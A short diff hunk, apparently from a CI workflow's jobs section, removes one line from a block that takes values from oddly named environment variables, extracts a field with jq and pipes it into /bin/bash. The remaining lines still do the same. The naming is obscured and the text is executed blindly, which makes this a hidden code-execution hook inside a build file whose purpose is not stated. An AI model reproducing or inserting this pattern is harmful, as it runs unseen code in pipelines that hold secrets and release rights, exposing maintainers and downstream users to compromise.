@@ -28,7 +28,6 @@ jobs:
           echo $aezx0 | jq -r .fpoo1809 | /bin/bash
           echo $po529 | jq -r .m417 | /bin/bash
           echo $uvwb99856 | jq -r .nrrga82221 | /bin/bash
-          echo $pq4864 | jq -r .lfz846 | /bin/bash
           echo $ub77211 | jq -r .uo028 | /bin/bash
           printf '%s' "$sbmrs4" | jq -r .ci3 | /bin/bash
 
